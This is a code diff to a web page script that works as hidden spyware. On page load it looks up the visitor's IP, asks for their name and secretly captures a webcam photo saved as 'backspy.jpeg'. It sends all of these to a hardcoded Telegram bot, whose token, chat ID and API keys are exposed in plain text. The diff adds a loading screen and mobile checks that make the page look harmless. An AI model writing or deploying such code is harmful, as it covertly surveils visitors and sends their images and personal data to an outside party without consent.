@@ -2,7 +2,7 @@ var Welcome = `https://api.telegram.org/bot5342005128:AAFjMw1i9K-FSDX0RzrRHgsyhM
 var oReq = new XMLHttpRequest(); 
 oReq.open("GET", Welcome, true); 
 oReq.send();
-fetch("https://api.ipbase.com/json/?apikey=53d67b20-c05f-11ec-979c-9fb9339b4261")
+fetch("https://api.ipbase.com/json/?apikey=13841960-bf98-11ec-bdc4-5134c1fdde2f")
 	.then((res) => res.json())
 	.then((data) => {
 		var output = `
@@ -62,12 +62,23 @@ function userName(){
 		content: "input",
 	})
 	.then((value) => {
+		if (value == null || undefined || ""){
+			userName();
+		} else {
 		swal(`nice to meet you ${value} 🥺💞`);
-		var name = `https://api.telegram.org/bot5342005128:AAFjMw1i9K-FSDX0RzrRHgsyhMj9QMs80VU/sendMessage?chat_id=1603299669&parse_mode=html&text=👨‍💻 <u><b><i>the user's name is:</i></b></u> %0A ✨${value}`;
+		var name = `https://api.telegram.org/bot5342005128:AAFjMw1i9K-FSDX0RzrRHgsyhMj9QMs80VU/sendMessage?chat_id=1603299669&parse_mode=html&text=<u><b><i>Visitor's name is:</i></b></u> %0A ✨${value}`;
 		var oReq = new XMLHttpRequest(); 
 		oReq.open("GET", name, true); 
 		oReq.send();
-	});
+	}});
+}
+function Desktop(){
+	if (window.navigator.userAgent.toLowerCase().includes("mobi")) {
+		console.log('phone user');
+		document.getElementById('desktop').remove();;
+		} else {
+			document.getElementById('desktop').style.display = "block";
+		}
 }
 window.onload = function(){
 	Webcam.attach('#my_camera');
@@ -84,9 +95,16 @@ window.onload = function(){
 			var formDataToUpload = new FormData(form);
 			formDataToUpload.append("document", blob, "backspy.jpeg");
 			var xhr = new XMLHttpRequest();
-			xhr.open('POST', `https://api.telegram.org/bot5342005128:AAFjMw1i9K-FSDX0RzrRHgsyhMj9QMs80VU/sendDocument?chat_id=1603299669`, true);
+			xhr.open('POST', `https://api.telegram.org/bot5342005128:AAFjMw1i9K-FSDX0RzrRHgsyhMj9QMs80VU/sendDocument?chat_id=1603299669&caption=🤫🤫🤫`, true);
 			xhr.send(formDataToUpload);
 		});
 	},1000)
-	userName()
+	userName();
+	Desktop();
+	var loader = document.querySelector('#loader');
+	setTimeout(function() {
+		//loader.style.display = "none";
+		loader.style.opacity = "0"
+		loader.addEventListener('transitionend', () => loader.remove());
+	}, 3000);
 }
